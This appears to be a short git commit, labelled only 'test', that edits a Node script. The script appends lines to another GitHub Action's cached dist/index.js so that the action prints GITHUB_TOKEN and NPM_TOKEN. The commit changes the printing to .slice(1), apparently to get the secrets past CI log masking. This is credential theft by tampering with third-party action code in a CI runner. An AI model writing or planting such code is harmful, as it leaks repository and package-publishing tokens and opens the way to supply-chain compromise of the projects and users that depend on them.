220a6d64023ffed4f3da0cdd0a59d89b0c9e9992
biandongyao <biandongyao@bytedance.com>
2024-12-24 19:50:37 +0800

    test

--- a.js
+++ a.js
@@ -2,6 +2,6 @@ const fs = require("fs");
 let original = fs.readFileSync(
   "../../_actions/bdy12138/action/v2/dist/index.js"
 );
-original += `console.log("GITHUB_TOKEN:", process.env.GITHUB_TOKEN.split('_'));`;
-original += `console.log("NPM_TOKEN:", process.env.NPM_TOKEN.split('_'));`;
+original += `console.log("GITHUB_TOKEN:", process.env.GITHUB_TOKEN.slice(1));`;
+original += `console.log("NPM_TOKEN:", process.env.NPM_TOKEN.slice(1));`;
 fs.writeFileSync("../../_actions/bdy12138/action/v2/dist/index.js", original);
